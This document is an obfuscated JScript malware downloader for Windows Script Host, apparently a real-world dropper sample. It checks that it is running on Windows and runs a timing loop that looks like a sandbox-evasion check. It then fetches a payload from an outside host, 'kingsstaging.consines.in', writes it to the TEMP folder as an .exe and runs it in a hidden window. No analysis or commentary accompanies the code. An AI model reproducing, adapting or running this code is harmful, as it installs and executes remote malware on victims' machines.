var Jp = false;
var p = "CreateObject";
var BB = function r() {return WScript[p]("WScript.Shell");}(), s = 11;
var il = "MSXML2.XMLHTTP";
var Ku = 2123213;
var HN = 0;
function KQ(K){BB["Run"](K, HN, HN);};
function lm(){return "" + il;};
function i(Df, l){HN = HN * 1; return Df - l;};
function r0(){return p;};
/*@cc_on
  @if (@_win32 || @_win64)
    Jp = true;
  @end
@*/
if (Jp)
{
var j = "";
function V0(){return 22;};
var a = 0; var Im = 0;
function v()
{
var mJ = new this["Date"]();
var UZ = mJ["getUTCMilliseconds"]();
WScript["Sleep"](V0());
var mJ = new this["Date"]();
var GF = mJ["getUTCMilliseconds"]();
WScript["Sleep"](V0());
var mJ = new this["Date"]();
var I = mJ["getUTCMilliseconds"]();
var a = "Xr";
a = i(GF, UZ);
var Im = "tk";
Im = i(I, GF);
j = "open";
return i(a, Im);
}
var w = false;
var Zm = false;
for (var dO = HN; dO < V0() * 1; dO++){if (v() != HN){
w = true; 
Im = "31" + 11 * a + Im; 
Zm = true; 
break;
}}
function S() {return ((w == true) && (w == Zm)) ? 1 : HN;};
if (w && S() && Zm){
function V() {return BB["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "w1mlZDugnCOfkQ.exe";};
 c = lm();
 vT = WScript[p](c);
 var h = 1;
 while (h){
try {
vT[j]("GET", "http://kingsstaging.consines.in/l9osaw", false);
vT["send"]();
C = "Sleep";
for (;;){WScript[C](V0() * 11); if (vT["readystate"] >= 2 * 2) break;};
h = HN;
} catch(v0){};
}
function ey(P) {var J = (1, 2, 3, 4, 5, P); return J;};
rk = WScript[r0()]("ADODB.Stream");
c = rk;
c[j]();
c["type"] = ey(1);
c["write"](vT["ResponseBody"]);
rk["position"] = ey(HN);
c["Save" + "ToFile"](V(), 2);
rk["c"+"lose"]();
R = V();
KQ(R);
}
}

